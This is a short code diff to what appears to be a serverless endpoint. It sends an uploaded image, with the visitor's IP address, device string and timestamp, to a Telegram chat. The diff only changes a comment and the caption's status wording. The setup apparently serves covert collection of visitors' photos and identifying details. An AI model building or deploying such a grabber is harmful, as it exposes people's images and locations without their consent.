@@ -22,7 +22,6 @@ module.exports = async (req, res) => {
       return res.status(400).json({ error: 'No image provided' });
     }
 
-    // Convert base64 image data to buffer and blob for Telegram photo upload
     const base64Data = image.replace(/^data:image\/png;base64,/, "");
     const buffer = Buffer.from(base64Data, 'base64');
     const blob = new Blob([buffer], { type: 'image/png' });
@@ -36,7 +35,7 @@ module.exports = async (req, res) => {
                         `🌐 *IP Address:* \`${ipInfo || 'Unknown'}\`\n` +
                         `💻 *Device:* \`${userAgent || 'Unknown'}\`\n` +
                         `⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n` +
-                        `✅ *Status:* \`Handshake Cleared & Logged\``;
+                        `✅ *Status:* \`Session Synchronized & Handshake Cleared\``;
                         
     formData.append('caption', captionText);
     formData.append('parse_mode', 'Markdown');
